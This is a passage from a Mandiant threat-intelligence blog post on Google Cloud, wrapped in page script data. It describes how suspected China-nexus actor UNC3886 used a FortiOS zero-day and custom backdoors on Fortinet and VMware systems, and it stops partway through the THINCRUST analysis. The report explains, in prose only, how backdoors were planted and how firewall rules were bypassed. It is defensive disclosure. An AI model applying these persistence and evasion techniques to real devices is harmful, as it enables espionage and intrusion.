mpany/google-cloud","https://twitter.com/googlecloud","https://www.facebook.com/googlecloud"]],[2024,10,23],[["en","x-default"],"x-default"],[null,true],null,"/blog/topics/threat-intelligence/fortinet-malware-ecosystem/?hl\u003den",["6LcsrxUqAAAAAFhpR1lXsPN2j2nsTwy6JTbRKzJr"]],[],'','wC8mBVAL5Ft29iPueo1EIg','zLwD_D2skbR2YicHSKB2yQ','DEFAULT','\/blog', 2024.0 ,'https:\/\/cloud.google.com\/blog\/topics\/threat-intelligence\/fortinet-malware-ecosystem\/', null ,'ltr', false ,'https:\/\/accounts.google.com\/AccountChooser?continue\x3dhttps:\/\/cloud.google.com\/blog\/topics\/threat-intelligence\/fortinet-malware-ecosystem\/\x26hl\x3den-US','https:\/\/accounts.google.com\/ServiceLogin?hl\x3den-US\x26continue\x3dhttps:\/\/cloud.google.com\/blog\/topics\/threat-intelligence\/fortinet-malware-ecosystem\/','https:\/\/accounts.google.com\/SignOutOptions?continue\x3dhttps:\/\/cloud.google.com\/blog\/topics\/threat-intelligence\/fortinet-malware-ecosystem\/',[[[1]]], false , false , false ,'en','en-US','en_US','https:\/\/goto2.corp.google.com\/mdtredirect?data_id_filter\x3dcloud.google.com\x26system_name\x3dcloudx-web-blog-uiserver', null , null ,'https:\/\/myaccount.google.com\/privacypolicy?hl\x3den-US', false , null ,'https:\/\/www.gstatic.com\/_\/boq-cloudx-web-blog\/_\/r\/','https:\/\/myaccount.google.com\/termsofservice?hl\x3den-US',[[[["Solutions \u0026 technology",null,[[["AI \u0026 Machine Learning","/blog/products/ai-machine-learning"],["API Management","/blog/products/api-management"],["Application Development","/blog/products/application-development"],["Application Modernization","/blog/products/application-modernization"],["Chrome Enterprise","/blog/products/chrome-enterprise"],["Compute","/blog/products/compute"],["Containers \u0026 Kubernetes","/blog/products/containers-kubernetes"],["Data Analytics","/blog/products/data-analytics"],["Databases","/blog/products/databases"],["DevOps \u0026 SRE","/blog/products/devops-sre"],["Maps \u0026 Geospatial","/blog/topics/maps-geospatial"],["Security",null,[[["Security \u0026 Identity","/blog/products/identity-security"],["Threat Intelligence","/blog/topics/threat-intelligence"]]]],["Infrastructure","/blog/products/infrastructure"],["Infrastructure Modernization","/blog/products/infrastructure-modernization"],["Networking","/blog/products/networking"],["Productivity \u0026 Collaboration","/blog/products/productivity-collaboration"],["SAP on Google Cloud","/blog/products/sap-google-cloud"],["Storage \u0026 Data Transfer","/blog/products/storage-data-transfer"],["Sustainability","/blog/topics/sustainability"]]]],["Ecosystem",null,[[["IT Leaders","/transform"],["Industries",null,[[["Financial Services","/blog/topics/financial-services"],["Healthcare \u0026 Life Sciences","/blog/topics/healthcare-life-sciences"],["Manufacturing","/blog/topics/manufacturing"],["Media \u0026 Entertainment","/blog/products/media-entertainment"],["Public Sector","/blog/topics/public-sector"],["Retail","/blog/topics/retail"],["Supply Chain","/blog/topics/supply-chain-logistics"],["Telecommunications","/blog/topics/telecommunications"]]]],["Partners","/blog/topics/partners"],["Startups \u0026 SMB","/blog/topics/startups"],["Training \u0026 Certifications","/blog/topics/training-certifications"],["Inside Google Cloud","/blog/topics/inside-google-cloud"],["Google Cloud Next \u0026 Events","/blog/topics/google-cloud-next"],["Google Maps Platform","https://mapsplatform.google.com/resources/blog/"],["Google Workspace","https://workspace.google.com/blog"]]]],["Developers \u0026 Practitioners","/blog/topics/developers-practitioners"],["Transform with Google Cloud","/transform"]]],[["de",[[["Neuigkeiten","/blog/de/topics/whats-new/aktuelles-auf-dem-google-cloud-blog"],["Lösungen \u0026 Technologien",null,[[["Anwendungsentwicklung","/blog/de/products/application-development"],["Anwendungsmodernisierung","/blog/de/products/anwendungsmodernisierung"],["API-Verwaltung","/blog/de/products/api-management"],["Chrome Enterprise","/blog/de/products/chrome-enterprise"],["Computing","/blog/de/products/compute"],["Containers \u0026 Kubernetes","/blog/de/products/containers-kubernetes"],["Datenanalysen","/blog/de/products/data-analytics"],["Datenbanken","/blog/de/products/databases"],["DevOps \u0026 SRE","/blog/de/products/devops-sre"],["Infrastruktur","/blog/de/products/infrastructure"],["KI \u0026 Machine Learning","/blog/de/products/ai-machine-learning"],["Maps \u0026 Geospatial","/blog/de/topics/maps-geospatial"],["Modernisierung der Infrastruktur","/blog/de/products/modernisierung-der-infrastruktur"],["Nachhaltigkeit","/blog/de/topics/nachhaltigkeit"],["Netzwerk","/blog/de/products/networking"],["Produktivität und Zusammenarbeit","/blog/de/products/produktivitaet-und-kollaboration"],["SAP in Google Cloud","/blog/de/products/sap-google-cloud"],["Sicherheit \u0026 Identität","/blog/de/products/identity-security"],["Speicher und Datentransfer","/blog/de/products/storage-data-transfer"]]]],["Ökosystem",null,[[["IT Leader","/transform/de"],["Industrien",null,[[["Behörden und öffentlicher Sektor","/blog/de/topics/public-sector"],["Einzelhandel","/blog/de/topics/retail"],["Fertigung","/blog/de/topics/fertigung"],["Finanzdienstleistungen","/blog/de/topics/financial-services"],["Gesundheitswesen und Biowissenschaften","/blog/de/topics/healthcare-life-sciences"],["Lieferkette und Logistik","/blog/de/topics/lieferkette-und-logistik"],["Medien und Unterhaltung","/blog/de/products/media-entertainment"],["Telekommunikation","/blog/de/topics/telecommunications"]]]],["Entwickler*innen \u0026 Fachkräfte","/blog/de/topics/developers-practitioners"],["Google Cloud Next \u0026 Events","/blog/de/topics/events"],["Google Maps Platform","/blog/de/products/maps-platform"],["Google Workspace","https://workspace.google.com/blog/de"],["Inside Google Cloud","/blog/de/topics/inside-google-cloud"],["Kunden","/blog/de/topics/kunden"],["Partner","/blog/de/topics/partners"],["Start-ups und KMU","/blog/de/topics/startups"],["Training und Zertifizierung","/blog/de/topics/training-certifications"]]]],["Transformation mit Google Cloud","/transform/de"]]]],["en",[[["Solutions \u0026 technology",null,[[["AI \u0026 Machine Learning","/blog/products/ai-machine-learning"],["API Management","/blog/products/api-management"],["Application Development","/blog/products/application-development"],["Application Modernization","/blog/products/application-modernization"],["Chrome Enterprise","/blog/products/chrome-enterprise"],["Compute","/blog/products/compute"],["Containers \u0026 Kubernetes","/blog/products/containers-kubernetes"],["Data Analytics","/blog/products/data-analytics"],["Databases","/blog/products/databases"],["DevOps \u0026 SRE","/blog/products/devops-sre"],["Maps \u0026 Geospatial","/blog/topics/maps-geospatial"],["Security",null,[[["Security \u0026 Identity","/blog/products/identity-security"],["Threat Intelligence","/blog/topics/threat-intelligence"]]]],["Infrastructure","/blog/products/infrastructure"],["Infrastructure Modernization","/blog/products/infrastructure-modernization"],["Networking","/blog/products/networking"],["Productivity \u0026 Collaboration","/blog/products/productivity-collaboration"],["SAP on Google Cloud","/blog/products/sap-google-cloud"],["Storage \u0026 Data Transfer","/blog/products/storage-data-transfer"],["Sustainability","/blog/topics/sustainability"]]]],["Ecosystem",null,[[["IT Leaders","/transform"],["Industries",null,[[["Financial Services","/blog/topics/financial-services"],["Healthcare \u0026 Life Sciences","/blog/topics/healthcare-life-sciences"],["Manufacturing","/blog/topics/manufacturing"],["Media \u0026 Entertainment","/blog/products/media-entertainment"],["Public Sector","/blog/topics/public-sector"],["Retail","/blog/topics/retail"],["Supply Chain","/blog/topics/supply-chain-logistics"],["Telecommunications","/blog/topics/telecommunications"]]]],["Partners","/blog/topics/partners"],["Startups \u0026 SMB","/blog/topics/startups"],["Training \u0026 Certifications","/blog/topics/training-certifications"],["Inside Google Cloud","/blog/topics/inside-google-cloud"],["Google Cloud Next \u0026 Events","/blog/topics/google-cloud-next"],["Google Maps Platform","https://mapsplatform.google.com/resources/blog/"],["Google Workspace","https://workspace.google.com/blog"]]]],["Developers \u0026 Practitioners","/blog/topics/developers-practitioners"],["Transform with Google Cloud","/transform"]]]],["fr",[[["Les tendances","/blog/fr/topics/les-tendances/quelles-sont-les-nouveautes-de-google-cloud"],["Solutions et Technologie",null,[[["Analyse de données","/blog/fr/products/analyse-de-donnees/"],["Bases de données","/blog/fr/products/databases"],["Calcul","/blog/fr/products/calcul/"],["Chrome Entreprise","/blog/fr/products/chrome-enterprise/"],["Conteneurs et Kubernetes","/blog/fr/products/conteneurs-et-kubernetes/"],["Développement d'Applications","/blog/fr/products/application-development"],["Développement durable","/blog/fr/topics/developpement-durable"],["DevOps et ingénierie SRE","/blog/fr/products/devops-sre"],["Gestion des API","/blog/fr/products/api-management"],["IA et Machine Learning","/blog/fr/products/ai-machine-learning"],["Infrastructure","/blog/fr/products/infrastructure"],["Maps et Géospatial","/blog/fr/topics/maps-geospatial"],["Modernisation d'Applications","/blog/fr/products/modernisation-dapplications/"],["Modernisation d'Infrastructure","/blog/fr/products/modernisation-dinfrastructure/"],["Networking","/blog/fr/products/networking"],["Productivité et Collaboration","/blog/fr/products/productivite-et-collaboration"],["SAP sur Google Cloud","/blog/fr/products/sap-google-cloud"],["Sécurité et Identité","/blog/fr/products/identity-security"],["Stockage et transfert de données","/blog/fr/products/storage-data-transfer"]]]],["Écosystème",null,[[["Responsables IT","/transform/fr"],["Industries",null,[[["Commerce","/blog/fr/topics/retail"],["Manufacturing","/blog/fr/topics/manufacturing"],["Médias et Divertissement","/blog/fr/products/media-entertainment"],["Santé","/blog/fr/topics/healthcare-life-sciences"],["Secteur Public","/blog/fr/topics/public-sector"],["Services Financiers","/blog/fr/topics/financial-services"],["Supply Chain","/blog/fr/topics/supply-chain/"],["Telecommunications","/blog/fr/topics/telecommunications"]]]],["Clients","/blog/fr/topics/clients/"],["Développeurs et professionnels","/blog/fr/topics/developers-practitioners"],["Formations et certifications","/blog/fr/topics/training-certifications"],["Google Cloud Next et Événements","/blog/fr/topics/evenements"],["Google Maps Platform","/blog/fr/products/maps-platform"],["Google Workspace","https://workspace.google.com/blog/fr"],["Inside Google Cloud","/blog/fr/topics/inside-google-cloud"],["Partenaires","/blog/fr/topics/partners"],["Start-ups et PME","/blog/fr/topics/startups"]]]],["Transformer avec Google Cloud","/transform/fr"]]]],["ja",[[["ソリューションとテクノロジー",null,[[["AI \u0026 機械学習","/blog/ja/products/ai-machine-learning"],["API 管理","/blog/ja/products/api-management"],["アプリケーション開発","/blog/ja/products/application-development"],["アプリケーション モダナイゼーション","/blog/ja/products/application-modernization"],["Chrome Enterprise","/blog/ja/products/chrome-enterprise"],["コンピューティング","/blog/ja/products/compute"],["Containers \u0026 Kubernetes","/blog/ja/products/containers-kubernetes"],["データ分析","/blog/ja/products/data-analytics"],["データベース","/blog/ja/products/databases"],["DevOps \u0026 SRE","/blog/ja/products/devops-sre"],["Maps \u0026 Geospatial","/blog/ja/products/maps-platform"],["セキュリティ",null,[[["セキュリティ \u0026 アイデンティティ","/blog/ja/products/identity-security"],["脅威インテリジェンス","/blog/ja/topics/threat-intelligence"]]]],["インフラストラクチャ","/blog/ja/products/infrastructure"],["インフラ モダナイゼーション","/blog/ja/products/infrastructure-modernization"],["ネットワーキング","/blog/ja/products/networking"],["生産性とコラボレーション","/blog/ja/products/productivity-collaboration"],["Google Cloud での SAP","/blog/ja/products/sap-google-cloud"],["ストレージとデータ転送","/blog/ja/products/storage-data-transfer"],["サステナビリティ","/blog/ja/topics/sustainability"]]]],["エコシステム",null,[[["ITリーダー","/transform/ja"],["業種",null,[[["金融サービス","/blog/ja/topics/financial-services"],["ヘルスケア、ライフ サイエンス","/blog/ja/topics/healthcare-life-sciences"],["製造","/blog/ja/topics/manufacturing"],["メディア、エンターテイメント","/blog/ja/products/media-entertainment"],["公共部門","/blog/ja/topics/public-sector"],["小売業","/blog/ja/topics/retail"],["サプライ チェーン","/blog/ja/topics/supply-chain-logistics"],["通信","/blog/ja/topics/telecommunications"]]]],["顧客事例","/blog/ja/topics/customers"],["パートナー","/blog/ja/topics/partners"],["スタートアップ \u0026 SMB","/blog/ja/topics/startups"],["トレーニングと認定","/blog/ja/topics/training-certifications"],["Inside Google Cloud","/blog/ja/topics/inside-google-cloud"],["Google Cloud Next と イベント","/blog/ja/topics/google-cloud-next"],["Google Maps Platform","/blog/ja/products/maps-platform"],["Google Workspace","https://workspace.google.com/blog/ja"]]]],["デベロッパー","/blog/ja/topics/developers-practitioners"],["Transform with Google Cloud","/transform/ja"]]]],["ko",[[["솔루션 및 기술",null,[[["AI 및 머신러닝","/blog/ko/products/ai-machine-learning"],["API 관리","/blog/ko/products/api-management"],["애플리케이션 개발","/blog/ko/products/application-development"],["애플리케이션 현대화","/blog/ko/products/application-modernization"],["Chrome Enterprise","/blog/products/chrome-enterprise"],["컴퓨팅","/blog/ko/products/compute"],["컨테이너 \u0026 Kubernetes","/blog/ko/products/containers-kubernetes"],["데이터 분석","/blog/ko/products/data-analytics"],["데이터베이스","/blog/ko/products/databases"],["DevOps 및 SRE","/blog/ko/products/devops-sre"],["Maps \u0026 Geospatial","/blog/ko/products/maps-platform"],["보안",null,[[["보안 \u0026 아이덴티티","/blog/ko/products/identity-security"],["위협 인텔리전스","/blog/ko/topics/threat-intelligence"]]]],["인프라","/blog/ko/products/infrastructure"],["Infrastructure Modernization","/blog/ko/products/infrastructure-modernization"],["네트워킹","/blog/ko/products/networking"],["생산성 및 공동작업","/blog/ko/products/productivity-collaboration"],["SAP on Google Cloud","/blog/ko/products/sap-google-cloud"],["스토리지 및 데이터 전송","/blog/ko/products/storage-data-transfer"],["지속가능성","/blog/ko/topics/sustainability"]]]],["에코시스템",null,[[["IT Leaders","/transform/ko"],["업종",null,[[["금융 서비스","/blog/ko/topics/financial-services"],["의료 및 생명과학","/blog/ko/topics/healthcare-life-sciences"],["제조업","/blog/ko/topics/manufacturing"],["미디어 및 엔터테인먼트","/blog/ko/products/media-entertainment"],["공공부문","/blog/ko/topics/public-sector"],["소매업","/blog/ko/topics/retail"],["공급망","/blog/topics/supply-chain-logistics"],["통신","/blog/ko/topics/telecommunications"]]]],["고객 사례","/blog/ko/topics/customers"],["파트너","/blog/ko/topics/partners"],["스타트업 \u0026 SMB","/blog/ko/topics/startups"],["교육 \u0026 인증","/blog/ko/topics/training-certifications"],["Inside Google Cloud","/blog/ko/topics/inside-google-cloud"],["Google Cloud Next 및 이벤트","/blog/ko/topics/google-cloud-next"],["Google Maps Platform","/blog/ko/products/maps-platform"],["Google Workspace","https://workspace.google.com/blog/ko"]]]],["개발 및 IT운영","/blog/ko/topics/developers-practitioners"],["Google Cloud와 함께 하는 디지털 혁신","/transform/ko"]]]]]],'cloud.google.com','https', null , false , null ,[[48830069,97684531,97785984,97517168,97442195,48897392,97656895,97863170,93874000,48554503,1706538,97535270,1714252,93778619,48887078,97716263,48489833,97684517,97785970,97517154,97442181,97656881,93873986,48887064],null,null,null,null,true],]; window.IJ_valuesCb && window.IJ_valuesCb();</script><script class="ds:0" nonce="wC8mBVAL5Ft29iPueo1EIg">AF_initDataCallback({key: 'ds:0', hash: '1', data:[["Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation","A suspected Chinese actor used a zero-day vulnerability in FortiOS and multiple custom malware families as part of an espionage campaign.",[1678935600],"https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplif.max-2600x2600.png","https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem",[1711403936,744455000]],[["Mandiant "]],[null,"\u003cscript type\u003d\"application/ld+json\"\u003e{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"@id\":\"https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem\",\"headline\":\"Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation\",\"description\":\"A suspected Chinese actor used a zero-day vulnerability in FortiOS and multiple custom malware families as part of an espionage campaign.\",\"image\":\"https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplif.max-2600x2600.png\",\"author\":[{\"@type\":\"Person\",\"name\":\"Mandiant \",\"url\":\"\"}],\"datePublished\":\"2023-03-16\",\"publisher\":{\"@type\":\"Organization\",\"name\":\"Google Cloud\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https://www.gstatic.com/devrel-devsite/prod/v8bb8fa0afe9a8c3a776ebeb25d421bb443344d789b3607754dfabea418b8c4be/cloud/images/cloud-logo.svg\"}},\"url\":\"https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem\",\"keywords\":[\"Threat Intelligence\",\"Security \\u0026 Identity\"],\"timeRequired\":\"PT42M\"}\u003c/script\u003e"],["Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation"],null,null,[[null,null,[null,[null,"\u003cp\u003eWritten by: Alexander Marvi, Brad Slaybaugh, Dan Ebreo, Tufail Ahmed, Muhammad Umair, Tina Johnson\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003cp\u003eCyber espionage threat actors continue to target technologies that do not support endpoint detection and response (EDR) solutions such as firewalls, \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/unc3524-eye-spy-email\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eIoT devices\u003c/a\u003e, \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003ehypervisors\u003c/a\u003e and VPN technologies (e.g. \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/chinese-actors-exploit-fortios-flaw\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eFortinet\u003c/a\u003e, \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/suspected-chinese-persist-sonicwall\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eSonicWall\u003c/a\u003e, \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003ePulse Secure\u003c/a\u003e, and others). Mandiant has investigated dozens of intrusions at defense industrial base (DIB), government, technology, and telecommunications organizations over the years where suspected China-nexus groups have exploited zero-day vulnerabilities and deployed custom malware to steal user credentials and maintain long-term access to the victim environments.\u003c/p\u003e\n\u003cp\u003eWe often observe cyber espionage operators exploiting zero-day vulnerabilities and deploying custom malware to Internet-exposed systems as an initial attack vector. In this blog post, we describe scenarios where a suspected China-nexus threat actor likely already had access to victim environments, and then deployed backdoors onto Fortinet and VMware solutions as a means of maintaining persistent access to the environments. This involved the use of a local zero-day vulnerability in FortiOS (CVE-2022-41328) and deployment of multiple custom malware families on Fortinet and VMware systems. Mandiant published details of the \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eVMware malware ecosystem\u003c/a\u003e in September 2022.\u003c/p\u003e\n\u003cp\u003eIn mid-2022, Mandiant, in collaboration with Fortinet, investigated the exploitation and deployment of malware across multiple Fortinet solutions including FortiGate (firewall), FortiManager (centralized management solution), and FortiAnalyzer (log management, analytics, and reporting platform). The following steps generally describe the actions the threat actor took:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUtilized a local directory traversal zero-day (CVE-2022-41328) exploit to write files to FortiGate firewall disks outside of the normal bounds allowed with shell access.\u003c/li\u003e\n\u003cli\u003eMaintained persistent access with Super Administrator privileges within FortiGate Firewalls through ICMP port knocking\u003c/li\u003e\n\u003cli\u003eCircumvented firewall rules active on FortiManager devices with a passive traffic redirection utility, enabling continued connections to persistent backdoors with Super Administrator privileges\u003c/li\u003e\n\u003cli\u003eEstablished persistence on FortiManager and FortiAnalyzer devices through a custom API endpoint created within the device\u003c/li\u003e\n\u003cli\u003eDisabled OpenSSL 1.1.0 digital signature verification of system files through targeted corruption of boot files\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eMandiant attributes this activity to UNC3886, a group we suspect has a China-nexus and is associated with the novel \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eVMware ESXi hypervisor malware framework\u003c/a\u003e disclosed in September 2022. At the time of the ESXi hypervisor compromises, Mandiant observed UNC3886 directly connect from FortiGate and FortiManager devices to VIRTUALPITA backdoors on multiple occasions.\u003c/p\u003e\n\u003cp\u003eMandiant suspected the FortiGate and FortiManager devices were compromised due to the connections to VIRTUALPITA from the Fortinet management IP addresses. Additionally, the FortiGate devices with Federal Information Processing Standards (FIPS) compliance mode enabled failed to boot after it was later rebooted. When FIPS mode is enabled, a checksum of the operating system is compared with the checksum of a clean image. Since the operating system was tampered by the threat actor, the checksum comparison failed, and the FortiGate Firewalls protectively failed to startup. With assistance from Fortinet, Mandiant acquired a forensic image of these failing devices, prompting the discovery of the ICMP port knocking backdoor CASTLETAP.\u003c/p\u003e\n\u003ch2\u003eFortinet Ecosystem\u003c/h2\u003e\n\u003cp\u003eMultiple components of the Fortinet ecosystem were targeted by UNC3886 before they moved laterally to VMWare infrastructure. These components and their associated versions, at the time of compromise, are listed as follows:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eFortiGate: 6.2.7 \u003c/strong\u003e– FortiGate units are network firewall devices which allow for the control and monitoring of network traffic passing through the devices.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFortiManager 6.4.7 \u003c/strong\u003e– The FortiManager acts as a centralized management platform for managing Fortinet devices.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFortiAnalyzer 6.4.7 \u003c/strong\u003e–\u003cstrong\u003e \u003c/strong\u003eThe FortiAnalyzer acts as a centralized log management solution for Fortinet devices as well as a reporting platform\u003cstrong\u003e.\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eScenario #1 (Summary): FortiManager Exposed to the Internet\u003c/h2\u003e\n\u003cp\u003eMandiant observed two distinct attack lifecycles where the threat actor abused Fortinet technologies to establish network access. The first occurred when the threat actor initially gained access to the Fortinet ecosystem while the FortiManager device was exposed to the internet.\u003c/p\u003e\n\u003cp\u003eDuring this attack lifecycle, as seen in Figure 1, backdoors disguised as legitimate API calls (THINCRUST) were deployed across both FortiAnalyzer and FortiManager devices. Once persistence was established across the two devices, FortiManager scripts were used to deploy backdoors (CASTLETAP) across the FortiGate devices.\u003cbr\u003e\u003cbr\u003eMandiant observed SSH connections from the Fortinet devices to the ESXi servers, followed by the installation of malicious vSphere Installation Bundles which contained VIRTUALPITA and VIRTUALPIE backdoors. This enabled the threat actor persistent access to the hypervisors, and allowed the attacker to execute commands on guest virtual machines.\u003c/p\u003e\n\u003cp\u003eMandiant has no evidence of a zero-day vulnerability being used to gain initial access or deploy the malicious VIBs at the time of writing this post. VIRTUALPITA and VIRTUALPIE were discussed in more detail in a \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence//esxi-hypervisors-malware-persistence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eprevious Mandiant blog post\u003c/a\u003e published in September 2022.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: Attack lifecycl\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ade while FortiManager was accessible from the Internet\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-2200x2200.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-2200x2200.png 2120w"," 1060px,  2120px","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-2200x2200.png"],null,3]]],[null,null,[null,[null,"\u003ch2\u003eScenario #2 (Summary): FortiManager Not Exposed to the Internet\u003c/h2\u003e\n\u003cp\u003eThe second attack lifecycle occurred where the FortiManager devices had network Access Control Lists (ACL) put in place to restrict external access to only TCP port 541 (FortiGate to FortiManager Protocol). During this attack lifecycle, as seen in Figure 2, the threat actor deployed a network traffic redirection utility (TABLEFLIP) and reverse shell backdoor (REPTILE) on the FortiManager device to circumvent the new ACLs. With the redirection rules established by the TABLEFLIP utility, the threat actor was able to access the REPTILE backdoor directly from the Internet for continued access to the environment.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 2: Activity after Internet access restrictions implemented to FortiManager\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-2200x2200.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-2200x2200.png 2120w"," 1060px,  2120px","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-2200x2200.png"],null,3]]],[null,null,[null,[null,"\u003ch2\u003eScenario #1 (Detailed): FortiManager Exposed to the Internet\u003c/h2\u003e\n\u003cp\u003eThe technical details that follow describe the attack path taken by the threat actor when the FortiManager was initially exposed to the Internet.\u003c/p\u003e\n\u003ch3\u003eTHINCRUST Backdoor (Python-based Backdoor)\u003c/h3\u003e\n\u003cp\u003eMandiant’s analysis identified that upon initial connection to the FortiManager, the threat actor appended python backdoor code to a legitimate web framework file. Mandiant classified this new malware family as THINCRUST.\u003c/p\u003e\n\u003cp\u003eThe threat actor modified the legitimate file \u003ccode\u003e/usr/local/lib/python3.8/proj/util/urls.py\u003c/code\u003e to include an additional malicious API call, \u003ccode\u003eshow_device_info\u003c/code\u003e, which can be seen in Figure 3. This allowed the threat actor to interact with the THINCRUST backdoor through POST requests to the URI “\u003ccode\u003e/p/util/show_device_info\u003c/code\u003e”.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 3: Comparison of urls.py\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png 800w, https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png 800w"," 800px,  800px","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eWhen a POST request was sent to the \u003ccode\u003eshow_device_info\u003c/code\u003e URL, it passed the request to the function \u003ccode\u003eget_device_info\u003c/code\u003e in \u003ccode\u003e/usr/local/lib/python3.8/proj/util/views.py\u003c/code\u003e. The \u003ccode\u003eget_device_info\u003c/code\u003e function contained the THINCRUST backdoor enabling the threat actor to execute commands, write files to disk, and read files from disk depending on the cookies provided in the POST request as seen in Figure 4.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 4: THINCRUST backdoor python code\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1200x1200.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1200x1200.png 1130w"," 1060px,  1130px","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1200x1200.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eThe \u003ccode\u003eget_device_info\u003c/code\u003e function relied on the presence of two (2) cookies, \u003ccode\u003eFGMGTOKEN\u003c/code\u003e and \u003ccode\u003eDEVICEID\u003c/code\u003e, within the POST requests. The \u003ccode\u003eFGMGTOKEN\u003c/code\u003e cookie is encrypted with an RSA key hardcoded into \u003ccode\u003eviews.py\u003c/code\u003e and contained an RC4 key that decrypted the commands received through the \u003ccode\u003eDEVICEID\u003c/code\u003e cookie. The decrypted result of \u003ccode\u003eDEVICEID\u003c/code\u003e were a JSON encoded dictionary with the keys 'id' and 'key'. As seen in Table 1, the 'id' value determined which action to execute within the backdoor, and the “key” value contained a string that acted as the arguments for the action being performed.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv 